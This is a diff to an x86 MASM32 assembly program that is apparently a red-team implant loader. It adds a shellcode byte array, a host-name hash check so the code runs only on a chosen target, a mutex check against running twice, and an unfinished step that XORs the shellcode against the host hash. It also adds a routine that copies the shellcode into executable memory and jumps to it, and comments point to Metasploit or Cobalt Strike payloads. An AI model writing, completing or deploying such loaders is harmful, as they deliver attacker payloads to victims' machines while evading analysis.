@@ -33,6 +33,7 @@ includelib \masm32\lib\advapi32.lib
 
 CheckExecution PROTO 
 MutexCheck PROTO
+ExecuteShellcode PROTO
 GetComputerInfo PROTO :DWORD
 GenerateHash PROTO :DWORD,:DWORD
 
@@ -56,6 +57,7 @@ MS_CALG_SHA1 equ 8004h
 MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
+SHELLCODELEN equ 303
 shellcode db 217,235,155,217,116,36,244,49,210,178,119,49,201,100,139,113,48,139,118,12
           db 139,118,28,139,70,8,139,126,32,139,54,56,79,24,117,243,89,1,209,255
           db 225,96,139,108,36,36,139,69,60,139,84,40,120,1,234,139,74,24,139,90
@@ -97,6 +99,12 @@ invoke ExitProcess, NULL    ; Exit cleanly when the time comes
 
 CheckExecution PROC uses esi edi
 
+ ; ============================================================================
+ ; 
+ ; CHECK 1: NETBIOS NAME vs STORED HASH
+ ;
+ ; ============================================================================
+
  ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
  invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
  mov esi, eax           ; Contains the raw computer name
@@ -114,10 +122,42 @@ CheckExecution PROC uses esi edi
  repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
  jnz badhash                    ; If they are different, the hash was incorrect
 
+
+
+ ; ============================================================================
+ ; 
+ ; CHECK 2: MUTEX
+ ;
+ ; ============================================================================
+
  ; Check to see whether the implant is already running or not
- invoke MutexCheck 
- test eax, eax
+ invoke MutexCheck   ; Perform the mutex check
+ test eax, eax       ; If return value is 0, don't continue
  jz done
+
+
+
+ ; ============================================================================
+ ; 
+ ; CHECK 3: XORing shellcode against hash of domain name
+ ;
+ ; ============================================================================
+
+ ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
+ invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
+ mov esi, eax           ; Contains the raw computer name
+ invoke lstrlen, esi    
+ mov ecx, eax           ; Contains the length of the FQDN
+ invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the FQDN
+ mov edi, eax           ; Contains the hash of the FQDN
+ invoke GlobalFree, esi ; Free the buffer
+
+ ; Now loop through the shellcode xoring it with the hash values (repeating hash
+ ; values if necessary)
+ ; ecx = The loop counter
+
+
+ invoke GlobalFree, edi ; Free the hash buffer
 
  ; Now run the shellcode
  invoke ExecuteShellcode
@@ -200,7 +240,7 @@ LOCAL hHash:DWORD
 LOCAL dwHashSize:DWORD
 LOCAL dwHashSizeLen:DWORD
 
- mov dwHashSizeLen, 4
+ mov dwHashSizeLen, 4 ; 32-bit :)
  invoke CryptAcquireContext, addr hProv, NULL, NULL, PROV_RSA_AES, NULL
  .if eax!=NULL
    invoke CryptCreateHash, hProv, MS_CALG_SHA1, NULL, NULL, addr hHash
@@ -239,8 +279,19 @@ GenerateHash ENDP
 ; 
 ; -----------------------------------------------------------------------------
 
-ExecuteShellcode PROC 
-
+ExecuteShellcode PROC uses esi edi
+  ; Allocate the memory for the shellcode
+  invoke VirtualAlloc, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE
+  .if eax!=0
+    mov edi, eax
+    push eax
+    mov esi, offset shellcode
+    mov ecx, SHELLCODELEN
+    cld
+    rep movsb
+    pop edx
+    call edx ; The shellcode should take over from here
+  .endif
 ExecuteShellcode ENDP
 
 End stufus
